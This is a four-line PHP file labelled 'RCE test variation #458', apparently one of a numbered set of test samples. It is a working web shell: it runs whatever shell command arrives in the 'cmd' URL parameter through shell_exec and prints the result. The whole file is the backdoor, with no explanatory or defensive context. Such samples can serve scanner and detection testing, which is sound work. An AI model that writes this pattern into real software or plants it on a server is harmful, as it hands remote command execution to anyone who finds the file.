<?php
// RCE test variation #458
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>